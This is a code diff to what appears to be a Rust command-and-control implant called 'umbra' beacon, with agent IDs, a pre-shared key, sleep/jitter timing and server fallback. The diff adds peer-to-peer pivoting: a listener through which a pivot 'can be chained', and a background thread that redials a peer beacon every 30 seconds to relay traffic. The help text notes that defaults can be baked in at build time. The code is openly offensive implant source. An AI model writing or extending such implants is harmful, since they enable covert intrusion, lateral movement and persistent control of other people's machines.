@@ -66,6 +66,9 @@ fn run() -> Result<(), String> {
     if let Some(v) = cli.jitter {
         cfg.jitter = v;
     }
+    if let Some(v) = cli.peer_listen.take() {
+        cfg.peer_listen = v;
+    }
     if cli.verbose {
         cfg.verbose = true;
     }
@@ -77,6 +80,14 @@ fn run() -> Result<(), String> {
         println!("agent_id    : {}", cfg.agent_id);
         println!("psk         : {} bytes (sha256 fingerprint {})", cfg.psk.len(), fingerprint(&cfg.psk));
         println!("sleep/jitter: {}s / {}%", cfg.sleep, cfg.jitter);
+        println!(
+            "peer listen: {}",
+            if cfg.peer_listen.is_empty() {
+                "off".to_string()
+            } else {
+                cfg.peer_listen.clone()
+            }
+        );
         println!("suites      : {:?}", crypto::supported_suites());
         return Ok(());
     }
@@ -89,6 +100,35 @@ fn run() -> Result<(), String> {
     }
 
     let mut beacon = Beacon::new(cfg);
+    if let Some(addr) = cli.peer_connect.take() {
+        let (host, port) = match addr.rsplit_once(':') {
+            Some((h, p)) => (h.to_string(), p.parse::<u16>().unwrap_or(0)),
+            None => (addr.clone(), 0),
+        };
+        if port == 0 {
+            return Err("--peer-connect needs a host:port".to_string());
+        }
+        let psk = beacon.cfg.psk.clone();
+        let agent_id = beacon.cfg.agent_id.clone();
+        let verbose = beacon.cfg.verbose;
+        std::thread::spawn(move || {
+            // The peer link is an extra road, not the only one: when it
+            // cannot be established, the server carries the traffic.
+            loop {
+                let target = format!("{host}:{port}");
+                if let Err(e) = umbra_beacon::tunnel::connect_peer(
+                    &host, port, &psk, &agent_id, verbose,
+                ) {
+                    if verbose {
+                        eprintln!(
+                            "[umbra] the peer link to {target} is down ({e}); the server carries the traffic"
+                        );
+                    }
+                }
+                std::thread::sleep(std::time::Duration::from_secs(30));
+            }
+        });
+    }
     beacon.run(cli.cycles)?;
     Ok(())
 }
@@ -137,6 +177,8 @@ struct Cli {
     sleep: Option<u64>,
     jitter: Option<u32>,
     cycles: Option<u64>,
+    peer_listen: Option<String>,
+    peer_connect: Option<String>,
     verbose: bool,
     check: bool,
     selftest: bool,
@@ -155,6 +197,8 @@ impl Cli {
             sleep: None,
             jitter: None,
             cycles: None,
+            peer_listen: None,
+            peer_connect: None,
             verbose: false,
             check: false,
             selftest: false,
@@ -177,6 +221,8 @@ impl Cli {
                 "--sleep" => cli.sleep = Some(next(&mut i)?.parse().map_err(|_| "--sleep: integer")?),
                 "--jitter" => cli.jitter = Some(next(&mut i)?.parse().map_err(|_| "--jitter: integer")?),
                 "--cycles" => cli.cycles = Some(next(&mut i)?.parse().map_err(|_| "--cycles: integer")?),
+                "--peer-listen" => cli.peer_listen = Some(next(&mut i)?),
+                "--peer-connect" => cli.peer_connect = Some(next(&mut i)?),
                 "--once" => cli.cycles = Some(1),
                 "--verbose" | "-v" => cli.verbose = true,
                 "--check" => cli.check = true,
@@ -208,6 +254,12 @@ OPTIONS:
         --jitter <percent>     jitter percentage (0-90)
         --cycles <n>           stop after n beacon cycles
         --once                 same as --cycles 1
+        --peer-listen <addr>   serve the peer link on this address (a pivot can be
+                               chained through this host); the address is reported
+                               to the server
+        --peer-connect <host:port>
+                               dial a peer beacon and carry the pivot over it;
+                               the server is the fallback when the link is down
     -v, --verbose              log to stderr
         --check                print the effective configuration and exit
         --selftest             run offline protocol self-tests
@@ -216,6 +268,6 @@ OPTIONS:
 
 ENVIRONMENT (also usable at build time to bake defaults in):
     UMBRA_SERVER UMBRA_PSK UMBRA_AGENT_ID UMBRA_TRANSPORT
-    UMBRA_SLEEP UMBRA_JITTER UMBRA_HTTP_PATH UMBRA_VERBOSE"
+    UMBRA_SLEEP UMBRA_JITTER UMBRA_HTTP_PATH UMBRA_VERBOSE UMBRA_PEER_LISTEN"
     );
 }
